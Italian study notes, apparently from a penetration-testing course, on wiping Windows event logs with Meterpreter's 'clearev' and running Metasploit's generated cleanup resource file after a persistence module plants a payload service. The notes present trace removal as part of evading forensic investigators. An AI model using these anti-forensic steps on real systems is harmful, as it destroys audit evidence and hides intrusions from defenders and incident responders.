
# Clearing Windows Event log
Windwos tiene traccia di qualsiasi azione che viene eseguita dentro al sistema operativo, queste azioni si chiamano Event Log e vengono conservati nel Windows Event Log. <br>
Gli event log si categorizzano in 3 tipi: 
- Application Logs che immagazinano gli eventi riguardanti le applicazioni come gli avii, i crash, ecc.
- System Logs memorizzano tutti gli eventi di sistema come l'avvio, il reboot, lo spegnimento, ecc.
- Security Logs memorizzano tutti gli eventi che riguardano la sicurezza nel sistema come i cambi di Passwords, Autenticazioni fallite, ecc.

Gli Event log possono essere visualizzati con `Event Viewer` su Windows e sono le prime informazioni che gli investigatori forence analizzano per identificare delle potenziali manomissioni di sitema o eventuali intrusioni. Per questo é molto imnportante pulire le tracce lasciatre nei log di sistema durante un penetration testing. <br>

per poter eliminare gli event log su meterpreter
```bash
clearev
```

---
### Usare gli script automatici
quando per esempio usiamo un modulo di persistenza, esso caricherá tati file dentro il sistema target. <br> 
dopo la sua esecuzione, generalmente, viene generato uno script automatico di petasploit per poter automatizzare la rimozione delle tracce:
```bash
# avremo un output del genere
[*] Started reverse TCP handler on IP:PORT 
[*] Running module against ATTACKDEFENSE
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\cZjWgLB.exe                                      # questo é il payload
[*] Creating service dxfcJWAI
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20250719.4239/ATTACKDEFENSE_20250719.4239.rc     # questo é il file di pulizia 
[*] Sending stage (176198 bytes) to IP
[*] Meterpreter session 2 opened (IP:PORT -> IPK:PORTK)
```
e da dentro meterpreter, possiamo usare il commando: 
```bash
resource /path/del/file/di/pulizia.rc
```
per poter automatizzare la rimozione dei file inseriti sul target. 
